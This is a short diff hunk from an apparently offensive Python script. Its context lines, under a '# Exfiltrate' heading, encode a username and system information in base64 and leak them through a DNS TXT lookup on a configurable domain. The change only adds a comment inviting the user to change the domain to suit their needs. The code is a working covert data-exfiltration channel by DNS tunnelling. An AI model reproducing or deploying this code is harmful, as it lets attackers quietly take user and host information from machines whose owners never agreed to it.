@@ -145,7 +145,7 @@ encoded_system_info = base64_encode(raw_system_info)
 
 # Exfiltrate
 import dns.resolver
-domain = ".homelab.local"
+domain = ".homelab.local" # change this to suit your needs
 encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
 try:
     dns.resolver.resolve(encoded_message, 'TXT')
